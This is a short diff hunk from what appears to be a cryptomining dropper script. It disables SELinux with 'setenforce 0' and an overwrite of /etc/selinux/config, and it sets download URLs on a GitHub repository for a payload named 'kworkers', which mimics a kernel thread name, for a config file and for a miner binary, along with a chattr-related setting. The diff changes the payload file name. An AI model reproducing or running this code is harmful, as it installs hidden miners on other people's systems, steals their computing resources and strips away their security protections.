@@ -49,8 +49,8 @@ setenforce 0
 echo SELINUX=disabled >/etc/selinux/config
 
 
-sh_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/kworker"
-sh_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/kworker" 
+sh_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/kworkers"
+sh_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/kworkers" 
 config_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/config.json"
 chattr_size="8000" 
 miner_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javae"
